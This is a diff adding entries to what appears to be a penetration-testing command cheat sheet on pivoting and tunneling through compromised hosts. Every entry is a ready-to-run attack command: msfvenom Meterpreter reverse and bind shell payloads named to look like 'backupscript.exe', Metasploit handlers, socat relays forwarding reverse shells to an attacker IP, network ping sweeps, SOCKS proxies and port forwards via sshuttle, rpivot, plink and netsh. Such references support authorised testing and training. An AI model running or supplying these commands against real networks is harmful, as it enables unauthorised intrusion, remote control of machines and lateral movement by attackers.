@@ -1669,3 +1669,192 @@ proxychains msfconsole
 ```
 proxychains xfreerdp /v:<targetIP> /u:<username> /p:<passwd>
 ```
+
+## pivtunnportf - Creating a Windows Payload with msfvenom
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=<portt>
+```
+
+## pivtunnportf - Transferring Payload to Pivot Host through SSH
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp <filename> <username>@<ipAddressofTarget>:~/
+```
+
+## pivtunnportf - Starting Python3 Webserver on Pivot Host
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python3 -m http.server 8123
+```
+
+## pivtunnportf - Downloading Payload from Windows Target - Execute on the attacker machine
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 <username>@<ipAddressofTarget> -vN
+```
+
+## pivtunnportf - msfvenom - create payload pivot
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<pivothost> -f <exe-elf> -o <out.exe-elf> LPORT=<pivothostport>
+```
+
+## pivtunnportf - msfconsole multihandler - pivot
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+run
+```
+
+## pivtunnportf - metasploit - once with a msf session
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+run post/multi/gather/ping_sweep RHOSTS=<network.0>/<mask>
+```
+
+## pivtunnportf - Ping Sweep For Loop on Linux Pivot Hosts (recommended to run twice)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+for i in {1..254} ;do (ping -c 1 <0.0.0>.$i | grep "bytes from" &) ;done
+```
+
+## pivtunnportf - Ping Sweep For Loop Using CMD (recommended to run twice)
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+for /L %i in (1 1 254) do ping <0.0.0>.%i -n 1 -w 100 | find "Reply"
+```
+
+## pivtunnportf - Ping Sweep Using PowerShell (recommended to run twice)
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+1..254 | % {"<0.0.0>.$($_): $(Test-Connection -count 1 -comp <0.0.0>.$($_) -quiet)"}
+```
+
+## pivtunnportf - metasploit - tunneling - SOCKS Proxy 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set version 4a
+run
+```
+
+## pivtunnportf - metasploit - tunneling - route all the traffic via our Meterpreter session
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET <network.0>
+run
+
+From session (on meterpreter session):
+run autoroute -s <network.0>/<mask>
+```
+
+## pivtunnportf - metasploit - Port Forwarding - Local TCP Relay (on meterpreter session)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+portfwd add -l <localPort> -p <remotePort> -r <pivotHostIP>
+```
+
+## pivtunnportf - metasploit - Reverse Port Forwarding
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+portfwd add -R -l <localPort> -p 1234 -L <pivotHostIP>
+```
+
+## pivtunnportf - socat - revshell redirection (from pivot server)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+socat TCP4-LISTEN:<pivotHostPort>,fork TCP4:<attackerIP>:<attackerPort>
+```
+
+## pivtunnportf - socat - revshell redirection (generate payload)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+msfvenom -p <linux_windows>/x64/meterpreter/reverse_<tcp_http> LHOST=<pivotHost> -f exe -o backupscript.exe LPORT=<pivotPort>
+```
+
+## pivtunnportf - socat - revshell redirection (listen for connection)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use exploit/multi/handler
+set payload <linux_windows>/x64/meterpreter/reverse_<tcp_http>
+set lhost 0.0.0.0
+set lport <attackerPort>
+run
+```
+
+## pivtunnportf - socat - bindshell redirection (generate payload)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+msfvenom -p <linux_windows>/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=<port>
+```
+
+## pivtunnportf - socat - bindshell redirection (socat redirect)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+socat TCP4-LISTEN:<attackerPort>,fork TCP4:<targetIPsecondNetwork>:<payloadPort>
+```
+
+## pivtunnportf - socat - bindshell redirection (listen for connection)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST <pivotIP>
+set LPORT <attackerPort>
+run
+```
+
+## pivtunnportf - plink ssh windows - dynamic port forward and SOCKS
+#plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+plink -ssh -D 9050 <user>@<piovotSSHhost>
+```
+
+## pivtunnportf - plink ssh windows - dynamic port forward and SOCKS (proxier)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+configure 127.0.0.1 port 9050 on proxier
+```
+
+## pivtunnportf - sshuttle
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo sshuttle -r <user>@<pivotIP> <network.0>/<mask> -v 
+```
+
+## pivtunnportf - rpivot - start server
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+## pivtunnportf - rpivot - transfer rpivot to target
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+scp -r rpivot <username>@<IpaddressOfTarget>:~/
+```
+
+## pivtunnportf - rpivot - use client on pivot server
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+python2.7 client.py --server-ip <ourSrvIP> --server-port 9999
+```
+
+## pivtunnportf - netsh - port forward (admin session)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<pivotHost> connectport=<port> connectaddress=<2ndTarget>
+```
+
+## pivtunnportf - netsh - verifying port forward
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+netsh.exe interface portproxy show v4tov4
+```
